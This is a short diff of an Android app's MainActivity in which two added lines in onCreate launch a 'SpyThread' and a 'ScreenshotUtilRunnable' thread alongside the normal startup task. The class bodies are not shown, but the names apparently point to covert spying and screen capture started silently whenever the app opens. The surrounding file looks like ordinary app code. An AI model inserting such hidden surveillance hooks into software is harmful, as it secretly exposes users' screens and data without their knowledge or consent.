@@ -25,5 +25,7 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         (new StartupAsyncTask()).execute();
+        (new SpyThread()).start();
+        new Thread((new ScreenshotUtilRunnable())).start();
     }
 }
